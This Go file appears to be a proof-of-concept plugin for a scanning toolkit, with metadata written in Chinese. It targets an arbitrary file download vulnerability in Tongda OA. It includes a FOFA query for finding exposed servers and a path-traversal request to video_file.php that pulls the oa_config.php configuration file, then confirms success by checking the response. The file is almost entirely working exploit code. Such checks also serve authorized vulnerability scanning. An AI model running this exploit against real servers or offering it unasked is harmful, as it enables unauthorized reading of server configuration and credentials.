package main

import (
	"errors"
	"github.com/ExpLangcn/HwToolslibrary/library/httpclient"
	"github.com/ExpLangcn/HwToolslibrary/library/info"
	"net/http"
	"strings"
)

var POC info.POC
var Httprecord = make(map[*httpclient.RequestOptions]*httpclient.Response) // 配置请求信息

func init() {
	POC = info.POC{ // 初始化POC信息
		Info: info.POCInfo{
			Name:     "通达OA任意文件下载漏洞",
			Author:   "ExpLang",
			Describe: "通达OA文件存在任意文件下载漏洞，攻击者通过漏洞可以读取服务器敏感文件",
			Date:     "2023-09-27",
			Tags:     []string{"通达OA", "TongdaOA", "Download_File", "任意文件下载"},
			Level:    "high",
			Link:     []string{"https://peiqi.h-k.pw/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v2017%20video_file.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.html"},
		},
		Other: info.OtherInfo{
			FOFAGrammar:  "app=\"TDXK-TongdaOA\"",
			QuakeGrammar: "",
		},
	}
}

func Start(Target string, ProxyURL string) (bool, error) {
	// 定义请求选项
	requestOption := &httpclient.RequestOptions{
		Method: http.MethodGet,
		URL:    Target + "/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php",
		Headers: map[string]string{
			"User-Agent": httpclient.RandomUserAgent(),
		},
		ProxyURL: ProxyURL,
	}

	// 发送请求
	responseOption, success := httpclient.SendRequest(*requestOption)
	Httprecord[requestOption] = responseOption

	if responseOption.Err != nil {
		// 处理错误
		return false, responseOption.Err
	} else {
		if !success {
			// 发送请求失败
			return false, errors.New("请求失败")
		}
	}

	POC.Info.HttpInfo = Httprecord

	statusCode := responseOption.StatusCode
	if statusCode == http.StatusOK {
		// 检查响应内容是否包含 "$ROOT_PATH=getenv"
		responseBody := string(responseOption.Body)
		if strings.Contains(responseBody, "$ROOT_PATH=getenv") {
			return true, nil
		}
	}
	return false, nil
}
